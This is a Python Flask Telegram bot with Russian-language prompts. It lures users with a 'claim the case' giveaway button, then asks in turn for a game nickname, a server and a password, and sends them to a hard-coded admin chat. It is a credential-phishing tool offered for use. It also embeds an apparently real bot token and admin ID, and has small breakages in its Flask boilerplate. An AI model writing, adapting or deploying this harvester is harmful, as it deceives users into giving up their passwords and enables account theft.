from flask import Flask, request
import requests

app = Flask(name)

BOT_TOKEN = "8637492412:AAFElecku3ksS2fHGT0kCnZkFp5mlZhWtac"
ADMIN_ID = "8704136526"

user_data = {}

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        data = request.json
        msg = data.get("message")
        callback = data.get("callback_query")
        
        if callback:
            chat_id = callback["message"]["chat"]["id"]
            user_id = callback["from"]["id"]
            user_data[user_id] = {"step": "nick"}
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": chat_id, "text": "Введи НИК:"})
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery", json={"callback_query_id": callback["id"]})
            return "OK"
        
        if msg and msg.get("text") == "/start":
            chat_id = msg["chat"]["id"]
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                "chat_id": chat_id,
                "text": "ЖМИ КНОПКУ",
                "reply_markup": {"inline_keyboard": [[{"text": "ЗАБРАТЬ КЕЙС", "callback_data": "case"}]]}
            })
            return "OK"
        
        if msg and msg.get("text"):
            user_id = msg["from"]["id"]
            chat_id = msg["chat"]["id"]
            text = msg["text"]
            
            if user_id in user_data:
                state = user_data[user_id]
                if state["step"] == "nick":
                    state["nick"] = text
                    state["step"] = "server"
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": chat_id, "text": "Введи СЕРВЕР:"})
                elif state["step"] == "server":
                    state["server"] = text
                    state["step"] = "password"
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": chat_id, "text": "Введи ПОРОЛЬ:"})
                elif state["step"] == "password":
                    report = f"НОВЫЙ КЕЙС!\nНИК: {state['nick']}\nСЕРВЕР: {state['server']}\nПОРОЛЬ: {text}"
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": ADMIN_ID, "text": report})
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": chat_id, "text": "Данные получены!"})
                    del user_data[user_id]
        return "OK"
    return "Bot running"

if name == "main":
    app.run(host="0.0.0.0", port=8080)
